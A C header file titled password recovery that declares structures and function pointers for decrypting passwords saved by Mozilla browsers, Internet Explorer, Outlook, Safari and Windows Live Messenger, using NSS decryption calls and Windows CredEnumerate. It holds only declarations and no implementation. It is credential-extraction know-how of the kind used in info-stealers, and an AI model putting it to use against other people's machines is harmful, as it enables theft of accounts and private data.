#ifndef PASSWORDRECOVERY_H_INCLUDED
#define PASSWORDRECOVERY_H_INCLUDED

#include "SQLite3.h"

#define HISTORY_CSIDL      0x0022

/* Mozilla Start */
typedef enum _SECItemType{
	siBuffer = 0,
	siClearDataBuffer = 1,
	siCipherDataBuffer = 2,
	siDERCertBuffer = 3,
	siEncodedCertBuffer = 4,
	siDERNameBuffer = 5,
	siEncodedNameBuffer = 6,
	siAsciiNameString = 7,
	siAsciiString = 8,
	siDEROID = 9,
	siUnsignedInteger = 10,
	siUTCTime = 11,
	siGeneralizedTime = 12
} SECItemType;

typedef struct _SECItem{
	SECItemType type;
	unsigned char *data;
	unsigned int len;
} SECItem;

typedef enum _SECStatus{
	SECWouldBlock = -2,
	SECFailure = -1,
	SECSuccess = 0
} SECStatus;

typedef struct PRArenaPool  PRArenaPool;

typedef SECStatus (_cdecl *FNSS_Init)(const char *configdir);
typedef unsigned long int *(_cdecl *FPK11_GetInternalKeySlot) (void);
typedef SECStatus (_cdecl *FPK11_Authenticate)(unsigned long int *slot, int loadCerts, void *wincx);
typedef SECStatus (_cdecl *FPK11SDR_Decrypt)(SECItem *data, SECItem *result, void *cx);
typedef void (_cdecl *FPK11_FreeSlot)(unsigned long int *slot);
typedef SECStatus (_cdecl *FNSS_Shutdown)(void);
typedef SECItem *(_cdecl *FNSSBase64_DecodeBuffer)(PRArenaPool *arenaOpt, SECItem *outItemOpt, const char *inStr, unsigned int inLen);

/* Mozilla End */


/* Windows Live Messenger Start */
typedef struct _CREDENTIAL_ATTRIBUTEA {
	LPSTR Keyword;
	DWORD Flags;
	DWORD ValueSize;
	LPBYTE Value;
}
CREDENTIAL_ATTRIBUTEA, *PCREDENTIAL_ATTRIBUTEA;

typedef struct _CREDENTIALA {
	DWORD Flags;
	DWORD Type;
	LPSTR TargetName;
	LPSTR Comment;
	FILETIME LastWritten;
	DWORD CredentialBlobSize;
	LPBYTE CredentialBlob;
	DWORD Persist;
	DWORD AttributeCount;
	PCREDENTIAL_ATTRIBUTEA Attributes;
	LPSTR TargetAlias;
	LPSTR UserName;
} CREDENTIALA, *PCREDENTIALA;

typedef CREDENTIALA CREDENTIAL;
typedef PCREDENTIALA PCREDENTIAL;

typedef BOOL (WINAPI *FCredEnumerate)(LPCTSTR, DWORD, DWORD *, PCREDENTIAL **);
typedef VOID (WINAPI *FCredFree)(PVOID);
/* Windows Live Messenger End */


/*
 - Microsoft Internet Explorer 7, 8 and 9
 - Microsoft Outlook 2002/2003/2007/2010 (POP3, IMAP, HTTP and SMTP Accounts)
*/
#define SHA1_HASH_LEN			0x14
#define INDEX_DAT_BLOCK_SIZE	0x80

//One Secret Info header specifying number of secret strings
struct IESecretInfoHeader
{
  DWORD dwIdHeader;     // value - 57 49 43 4B
  DWORD dwSize;         // size of this header....24 bytes
  DWORD dwTotalSecrets; // divide this by 2 to get actual website entries
  DWORD unknown;
  DWORD id4;            // value - 01 00 00 00
  DWORD unknownZero;
};

//Main Decrypted Autocomplete Header data
struct IEAutoComplteSecretHeader
{
  DWORD dwSize;           //This header size
  DWORD dwSecretInfoSize; //= sizeof(IESecretInfoHeader) + numSecrets * sizeof(SecretEntry);
  DWORD dwSecretSize;     //Size of the actual secret strings such as username & password
  struct IESecretInfoHeader IESecretHeader;  //info about secrets such as count, size etc
  //SecretEntry secEntries[numSecrets]; //Header for each Secret String
  //WCHAR secrets[numSecrets];          //Actual Secret String in Unicode
};

// Header describing each of the secrets such ass username/password.
// Two secret entries having same SecretId are paired
struct SecretEntry
{
   DWORD dwOffset;    //Offset of this secret entry from the start of secret entry strings
   BYTE  SecretId[8]; //UNIQUE id associated with the secret 
   DWORD dwLength;    //length of this secret 
};

int StrPosition(int StartPos, const char *Pattern, const char *Str);
size_t StrCopy(char *dst, const char *src, size_t Size);

/* Functions */
void GetMozillaProductPasswords();
void GetInternetExplorerPasswords();
void GetAppleSafariPasswords();

#endif // PASSWORDRECOVERY_H_INCLUDED
